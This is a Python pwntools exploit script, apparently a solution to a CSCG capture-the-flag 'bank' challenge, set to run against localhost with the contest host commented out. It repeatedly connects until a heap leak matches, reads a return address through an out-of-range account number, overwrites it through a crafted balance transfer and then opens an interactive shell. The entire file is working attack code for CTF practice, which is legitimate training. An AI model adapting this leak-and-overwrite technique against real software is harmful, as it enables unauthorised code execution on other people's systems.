import pwn
host = "localhost"
port = 1025
#host = "844b0780d7a2a1f6d31236ee-1024-bank.challenge.cscg.live"
#port = 1337

l = pwn.log.progress("brute force")
while True:
    pwn.context.log_level = 'error'
    try:

        #p = pwn.remote(host, port, ssl = True )
        p = pwn.remote(host, port)

        def add_acc(val):
            p.sendlineafter(b"choice: ",b"1")
            p.sendlineafter(b"Name: ",62 * b"A")
            p.sendlineafter(b"Balance: ", val)
            p.recvline()
            return p.recvline().split(b"Number: ")[1][:-1]
            

        def read(acc_num):
            p.sendlineafter(b"choice: ",b"2")
            p.sendlineafter(b"Number: ",acc_num)
            acc = p.recvline()
            name = p.recvline()
            print(acc)
            print(name)
            bal = p.recvline().split(b"Balance: ")[1][:-1]
            return bal
        
        def transfer(sender, receiver, amount):
            p.sendlineafter(b"choice: ", b"3")
            p.sendlineafter(b"Number: ", sender)
            p.sendlineafter(b"Number: ", receiver)
            p.sendlineafter(b"Amount: ", amount)
        def stop():
            p.sendlineafter(b"choice: ", b"4")
            

        heap_leak = int(read(b'0').decode())
        if heap_leak & 0xff != 0x23:
            p.close()
            continue
        tar = heap_leak - 9651
        ret_address = int(read(f"{tar}".encode()))
        offset = 0x150 - 0x37
        tmp = add_acc(f'{offset}'.encode())
        transfer(tmp, f"{tar}".encode(), f"{offset}".encode())
        stop()
        p.interactive()
    except EOFError:
        p.close()
        continue
